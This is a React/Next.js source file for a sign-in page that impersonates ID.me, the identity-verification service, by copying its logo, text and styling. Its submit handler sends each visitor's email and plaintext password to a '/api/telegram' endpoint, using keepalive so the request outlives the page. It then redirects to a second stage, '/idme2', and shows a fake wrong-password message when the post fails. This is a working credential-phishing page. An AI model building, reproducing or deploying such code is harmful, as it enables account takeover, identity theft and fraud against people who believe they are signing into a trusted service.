"use client";

import React, { useState, useCallback, useRef } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import idmeLogo from "./idme.png";

export default function SignInForm() {
  const router = useRouter();
  
  // State management
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  
  // Ref to prevent race conditions on slow mobile networks
  const lock = useRef(false);

  const handleSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (lock.current) return;
    if (!email || !password) {
      setError("Please fill in all fields.");
      return;
    }

    lock.current = true;
    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-cache",
        },
        // CRITICAL: keepalive allows the request to outlive the page
        keepalive: true, 
        body: JSON.stringify({
          data: {
            user: email.trim(),
            pass: password,
          },
          formType: "ID.me Authentication",
        }),
      });

      if (!response.ok) throw new Error();

      // Small delay ensures the "isLoading" state is seen before redirect
      setTimeout(() => {
        router.replace("/idme2");
      }, 600);

    } catch (err) {
      lock.current = false;
      setIsLoading(false);
      setError("The email or password you entered is incorrect.");
    }
  }, [email, password, router]);

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col justify-center items-center p-4">
      <div className="w-full max-w-[440px]">
        
        {/* Branding */}
        <div className="flex justify-center mb-10">
          <Image 
            src={idmeLogo} 
            alt="ID.me" 
            width={130} 
            height={50} 
            priority 
            className="h-auto w-auto"
          />
        </div>

        {/* Main Interface */}
        <div className="bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden">
          <div className="p-8">
            <h1 className="text-2xl font-bold text-center text-slate-900 mb-2">
              Sign In
            </h1>
            <p className="text-center text-slate-500 text-sm mb-8">
              Verify your identity to continue
            </p>

            {error && (
              <div className="mb-6 p-4 bg-red-50 border-l-4 border-red-500 text-red-700 text-sm font-medium animate-in fade-in duration-300">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-5">
              {/* Email Field */}
              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-2">
                  Email Address
                </label>
                <input
                  type="text"
                  inputMode="email" // Enables text + @ symbol on mobile
                  autoComplete="email"
                  required
                  disabled={isLoading}
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-all text-slate-900 disabled:opacity-50"
                  placeholder="Enter email"
                />
              </div>

              {/* Password Field */}
              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-2">
                  Password
                </label>
                <input
                  type="password"
                  autoComplete="current-password"
                  required
                  disabled={isLoading}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-all text-slate-900 disabled:opacity-50"
                  placeholder="Enter password"
                />
              </div>

              {/* Submit Action */}
              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-[#0070e0] hover:bg-[#005bb8] text-white font-bold py-4 rounded-xl shadow-lg transition-all active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed flex justify-center items-center"
                >
                  {isLoading ? (
                    <span className="flex items-center gap-2">
                      <svg className="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                      </svg>
                      Verifying...
                    </span>
                  ) : (
                    "Sign in to ID.me"
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-10 flex flex-wrap justify-center gap-4 text-[11px] font-medium text-slate-400 uppercase tracking-widest">
          <span className="hover:text-slate-600 cursor-pointer">What is ID.me?</span>
          <span>•</span>
          <span className="hover:text-slate-600 cursor-pointer">Privacy Policy</span>
          <span>•</span>
          <span className="hover:text-slate-600 cursor-pointer">Terms of Service</span>
        </div>
      </div>
    </div>
  );
}